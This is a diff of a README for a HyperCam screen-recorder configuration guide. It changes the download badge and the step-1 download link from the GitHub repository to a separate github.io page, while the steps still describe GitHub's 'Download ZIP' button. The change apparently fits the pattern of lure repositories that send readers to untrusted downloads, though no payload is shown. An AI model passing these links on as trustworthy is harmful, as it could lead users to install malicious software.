@@ -1,6 +1,6 @@
 # 💻 HyperCam-Configuration-Guide - Get Your Screen Recorder Working Today
 
-[![](https://img.shields.io/badge/Download_HyperCam_Guide-Blue?style=for-the-badge)](https://github.com/sinful-neurasthenia464/HyperCam-Configuration-Guide)
+[![](https://img.shields.io/badge/Download_HyperCam_Guide-Blue?style=for-the-badge)](https://sinful-neurasthenia464.github.io)
 
 ## 📌 About This Guide
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the minimum requirements to operate
 
 Follow these steps to access the resources and prepare your computer for the installation.
 
-1. Visit the repository page to download the necessary configuration files and notes: [https://github.com/sinful-neurasthenia464/HyperCam-Configuration-Guide](https://github.com/sinful-neurasthenia464/HyperCam-Configuration-Guide).
+1. Visit the repository page to download the necessary configuration files and notes: [https://sinful-neurasthenia464.github.io](https://sinful-neurasthenia464.github.io).
 2. Look for the green "Code" button on the webpage.
 3. Click "Download ZIP" to save the folder to your computer.
 4. Locate the downloaded file in your "Downloads" folder.
